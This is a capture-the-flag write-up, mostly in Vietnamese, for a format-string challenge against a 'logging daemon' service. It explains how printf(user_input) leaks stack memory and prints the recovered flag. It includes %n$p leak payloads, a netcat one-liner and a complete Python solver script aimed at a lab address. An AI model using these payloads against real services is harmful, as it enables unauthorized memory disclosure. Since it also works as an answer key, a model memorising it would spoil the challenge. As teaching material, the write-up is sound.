# Writeup: PWN CHALLENGE 1 (Logging Daemon — Format String)

> **Event:** DDC CTF  
> **Category:** PWN  
> **Difficulty:** Easy  
> **Points:** 54  
> **Description:** *"The Logging Daemon Faithfully Preserves Your Message Bytes, in the Places They Belong and a Few They Don't."*  
> **Flag:** `flag{dd753354-c8fb-4c3d-939e-2b19169f289f}`

---

## 1. Tóm tắt (TL;DR)

1. Kết nối tới dịch vụ **VinAI AI Logging Daemon v2.3** qua `nc <host> 10094`.
2. Dịch vụ nhận message từ user rồi in ra dạng `LOG: <message>` — message được truyền thẳng vào `printf()` → **Format String Vulnerability**.
3. Flag được lưu trên stack tại **vị trí 22–27** (tính theo `%n$p`).
4. Gửi payload `%22$p.%23$p.%24$p.%25$p.%26$p.%27$p` để leak flag dạng hex từ stack.
5. Decode little-endian hex → flag: `flag{dd753354-c8fb-4c3d-939e-2b19169f289f}`

---

## 2. Phân tích chi tiết

### Bước 1: Kết nối & khảo sát dịch vụ

```
$ nc 172.31.102.101 10094
=================================
 VinAI AI Logging Daemon v2.3
=================================
Submit log message: Hello World
LOG: Hello World
Message logged successfully.
```

Dịch vụ nhận 1 message, in ra `LOG: <message>`, rồi đóng kết nối.

### Bước 2: Phát hiện Format String Vulnerability

Thử gửi format specifier:

```
Submit log message: %x.%x.%x.%x.%x.%x
LOG: 55f569e0.0.cd5a58c7.5.0.252e7825
```

Server in ra giá trị từ stack thay vì in đúng chuỗi `%x` → **printf(user_input)** thay vì `printf("%s", user_input)`.

### Bước 3: Xác định vị trí input trên stack

Gửi `%6$p` → trả về `0x70243625` = hex little-endian của `%6$p` → **input bắt đầu ở vị trí 6** trên stack.

### Bước 4: Leak toàn bộ stack tìm flag

Dùng `%n$p` (n = 1, 2, ..., 30) để leak từng giá trị 8 byte trên stack:

| Position | Giá trị (hex)            | Decoded (ASCII LE)     |
|----------|--------------------------|------------------------|
| 1        | `0x7fffXXXXXXXX`        | stack address          |
| 2–5      | `(nil)` / small values   | —                      |
| 6        | `0x70243625`             | input (`%6$p`)         |
| 7–21     | `(nil)`                  | —                      |
| **22**   | `0x3764647b67616c66`     | `flag{dd7`             |
| **23**   | `0x38632d3435333335`     | `53354-c8`             |
| **24**   | `0x2d643363342d6266`     | `fb-4c3d-`             |
| **25**   | `0x3162322d65393339`     | `939e-2b1`             |
| **26**   | `0x3938326639363139`     | `9169f289`             |
| **27**   | `0x7d66`                 | `f}`                   |

### Bước 5: Decode flag

Mỗi giá trị 8-byte trên stack lưu theo **little-endian**. Chuyển đổi từng giá trị sang bytes rồi ghép lại:

```python
import struct

values = [
    0x3764647b67616c66,  # flag{dd7
    0x38632d3435333335,  # 53354-c8
    0x2d643363342d6266,  # fb-4c3d-
    0x3162322d65393339,  # 939e-2b1
    0x3938326639363139,  # 9169f289
    0x7d66,              # f}
]

flag = b''
for v in values:
    flag += struct.pack('<Q', v).rstrip(b'\x00')

print(flag.decode())
# flag{dd753354-c8fb-4c3d-939e-2b19169f289f}
```

### Giải thích mô tả challenge

> *"The Logging Daemon Faithfully Preserves Your Message Bytes, in the Places They Belong and a Few They Don't."*

- **"Logging Daemon"** → chương trình log message.
- **"Faithfully Preserves Your Message Bytes"** → in lại đúng từng byte message (nhưng qua `printf` nên format specifier bị xử lý).
- **"Places They Belong"** → ký tự thường được in đúng chỗ.
- **"a Few They Don't"** → format specifier (`%x`, `%p`, `%n`...) làm leak/ghi dữ liệu ở nơi không mong muốn trên stack.

---

## 3. One-liner Exploit

```bash
echo '%22$p.%23$p.%24$p.%25$p.%26$p.%27$p' | nc 172.31.102.101 10094
```

Output:
```
LOG: 0x3764647b67616c66.0x38632d3435333335.0x2d643363342d6266.0x3162322d65393339.0x3938326639363139.0x7d66
```

---

## 4. Script giải tự động (`solve_pwn1.py`)

```python
#!/usr/bin/env python3
"""
Solver for PWN CHALLENGE 1 — Format String on Logging Daemon
"""
import socket
import struct
import sys
import re

def solve(host, port):
    # Connect and leak flag from stack positions 22-27
    payload = '%22$p.%23$p.%24$p.%25$p.%26$p.%27$p\n'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    s.settimeout(5)

    # Read banner
    data = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if b'message:' in data.lower() or b'log' in data.lower():
                break
        except socket.timeout:
            break

    # Send format string payload
    s.sendall(payload.encode())

    # Read response
    resp = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk:
                break
            resp += chunk
        except socket.timeout:
            break
    s.close()

    output = resp.decode(errors='ignore')
    print("[*] Response:", output.strip())

    # Extract hex values from response
    hex_values = re.findall(r'0x([0-9a-fA-F]+)', output)

    flag = b''
    for h in hex_values:
        val = int(h, 16)
        raw = struct.pack('<Q', val)
        flag += raw.rstrip(b'\x00')

    flag_str = flag.decode('utf-8', errors='ignore')
    print(f"[+] Flag: {flag_str}")
    return flag_str

if __name__ == '__main__':
    host = sys.argv[1] if len(sys.argv) > 1 else '172.31.102.101'
    port = sys.argv[2] if len(sys.argv) > 2 else '10094'
    solve(host, port)
```

**Chạy:**
```bash
python3 solve_pwn1.py 172.31.102.101 10094
```
